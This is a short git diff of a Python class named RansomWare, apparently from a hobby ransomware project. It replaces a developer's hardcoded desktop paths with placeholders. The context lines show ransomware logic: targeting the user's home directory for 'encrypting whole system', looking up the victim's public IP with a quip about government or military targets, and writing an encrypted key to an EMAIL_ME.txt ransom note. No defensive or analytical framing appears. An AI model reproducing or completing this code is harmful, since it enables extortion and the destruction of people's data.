@@ -40,7 +40,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use TestFolder to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.TestFolder = r'C:\Users\dylan\Desktop\TestFolder'  # Debugging/Testing
+        self.TestFolder = r'Insert absolute path for your test folder'  # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -73,7 +73,7 @@ class RansomWare:
             # Write encrypted fernet key to file
             f.write(enc_fernent_key)
         # Write encrypted fernet key to dekstop as well so they can send to be unencrypted and get system/files back
-        with open(f'C:/Users/dylan/Desktop/EMAIL_ME.txt', 'wb') as fa:
+        with open(f' insert absolute path', 'wb') as fa:
             fa.write(enc_fernent_key)
         # Assign self.key to encrypted fernet key
         self.key = enc_fernent_key
